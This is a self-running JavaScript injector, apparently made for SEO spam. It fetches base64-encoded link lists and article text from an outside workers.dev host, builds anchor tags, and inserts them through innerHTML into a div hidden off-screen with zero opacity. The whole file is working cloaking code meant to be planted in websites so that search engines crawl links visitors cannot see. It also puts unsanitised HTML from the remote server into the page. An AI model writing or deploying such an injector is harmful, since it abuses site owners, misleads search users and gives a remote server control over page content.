!function(){
try{
  if(document.getElementById("bunker-payload-1")) return;

  const API_BASE = "https://smw.jsload.workers.dev";
  const TOKEN = "seo_mafia_web";
  const decode = (s) => {
    try {
      return new TextDecoder().decode(
        Uint8Array.from(atob(s), c => c.charCodeAt(0))
      );
    } catch(e) {
      console.error("Decode error:", e);
      return "";
    }
  };
  async function getData(id){
    try{
      const res = await fetch(
        `${API_BASE}/data?id=${encodeURIComponent(id)}&token=${encodeURIComponent(TOKEN)}`,
        { cache: "no-store" }
      );
      if(!res.ok) throw new Error("Fetch failed: " + res.status);
      const json = await res.json();
      if(!json || !json.payload) throw new Error("Invalid payload");
      return decode(json.payload);
    }catch(err){
      console.error("Fetch error ("+id+"):", err);
      return "";
    }
  }

  Promise.all([
    getData("b1"),
    getData("a1")
  ]).then(([anchorsRaw, articleRaw]) => {

    if(!anchorsRaw || !articleRaw){
      console.warn("Data kosong, inject dibatalkan");
      return;
    }

    anchorsRaw = anchorsRaw.replace(/"/g,"").trim();
    articleRaw = articleRaw.trim();

    const anchors = anchorsRaw
      .split("\n")
      .map(x => x.trim())
      .filter(Boolean)
      .map(line => {

        const parts = line.split("|").map(x=>x.trim()).filter(Boolean);
        if(parts.length < 2) return "";

        const anchorText = parts[0];
        return parts.slice(1).map(url=>{
          return `<a href="${url}" target="_blank">${anchorText}</a>`;
        }).join(" ");

      })
      .filter(Boolean);

    if(!anchors.length){
      console.warn("Anchor kosong");
      return;
    }

    let i = 0;
    let html = "";
    if(/\{ANCHOR/i.test(articleRaw)){
      html = articleRaw.replace(/\{ANCHOR\s*\}/gi, () => {
        return anchors[i++ % anchors.length];
      });
    }else{
      console.warn("⚠️ {ANCHOR} tidak ditemukan → fallback aktif");
      html = anchors.join(" ");
    }
    function inject(){
      if(document.getElementById("bunker-payload-1")) return;

      const box = document.createElement("div");
      box.id = "bunker-payload-1";
      box.style.cssText = "position:absolute;left:-9999px;opacity:0;font-size:0;";
      box.innerHTML = html;
      document.body.appendChild(box);
      console.log("✅");
    }

    if(document.readyState !== "loading"){
      inject();
    }else{
      document.addEventListener("DOMContentLoaded", inject);
    }

  });

}catch(e){
  console.error("Injector fatal error:", e);
}
}();
